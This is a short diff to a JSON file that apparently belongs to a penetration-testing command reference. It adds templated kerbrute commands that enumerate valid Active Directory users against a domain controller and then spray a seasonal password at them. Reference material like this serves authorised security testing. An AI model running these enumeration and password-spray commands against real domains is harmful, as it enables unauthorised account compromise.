@@ -74,5 +74,21 @@
   },
   "tools": [
     "kerbrute"
+  ],
+  "variations": [
+    {
+      "label": "Single user check",
+      "command": "kerbrute userenum -d <domain> --dc <dc_ip> <username>"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Enumerate valid users (no lockout)",
+      "command": "kerbrute userenum -d <domain> --dc <dc_ip> <userlist> -o valid_users.txt"
+    },
+    {
+      "label": "Spray a password against the valid users",
+      "command": "kerbrute passwordspray -d <domain> --dc <dc_ip> valid_users.txt '<Season2024>'"
+    }
   ]
 }
